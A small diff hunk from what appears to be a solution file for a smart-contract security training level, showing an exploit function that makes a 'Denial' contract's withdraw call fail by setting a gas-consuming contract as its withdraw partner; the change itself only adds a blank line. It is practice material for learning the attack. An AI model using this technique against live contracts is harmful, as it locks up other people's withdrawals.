@@ -13,6 +13,7 @@ def test_lv20():
 def exploit_lv20(contract: Denial):
     # Attack vector: function, that 'never' reverts
     # Training: find opcode, that forces function to use all gas -> Denial.withdraw() function reverts
+
     exploitContract = BrokenContract.deploy()
     contract.call(value=100)
     contract.setWithdrawPartner(exploitContract.address)
